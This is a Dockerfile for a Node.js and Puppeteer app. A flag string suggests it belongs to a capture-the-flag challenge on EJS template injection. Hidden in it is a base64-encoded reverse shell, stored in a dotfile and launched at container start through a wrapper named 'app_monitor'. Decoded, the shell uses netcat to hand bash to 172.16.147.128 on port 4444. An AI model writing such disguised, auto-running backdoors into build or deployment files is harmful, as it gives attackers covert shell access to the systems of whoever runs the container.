FROM node:latest

# Install dependencies for Puppeteer
RUN apt-get update && apt-get install -y \
    libnss3 \
    libnspr4 \
    libatk1.0-0 \
    libatk-bridge2.0-0 \
    libcups2 \
    libdrm2 \
    libxkbcommon0 \
    libxcomposite1 \
    libxdamage1 \
    libxfixes3 \
    libxrandr2 \
    libgbm1 \
    libasound2 \
    libgtk-3-0 \
    netcat-traditional

WORKDIR /usr/src/app

COPY package*.json ./
RUN npm install

COPY . .

RUN echo 'CBJS{SstI_EjS_BuG}' > /root/.flag

RUN echo 'IyEvYmluL2Jhc2hcbi9iaW4vbmMgLWUgL2Jpbi9iYXNoIDE3Mi4xNi4xNDcuMTI4IDQ0NDQgMj4vZGV2L251bGw=' > /usr/local/bin/.app_monitor
RUN echo $'#!/bin/bash\necho "$(cat /usr/local/bin/.app_monitor | base64 -d)" | bash' > /usr/local/bin/app_monitor
RUN chmod +x /usr/local/bin/app_monitor

EXPOSE 1212

CMD ["sh", "-c", "/usr/local/bin/app_monitor & node server.js"]
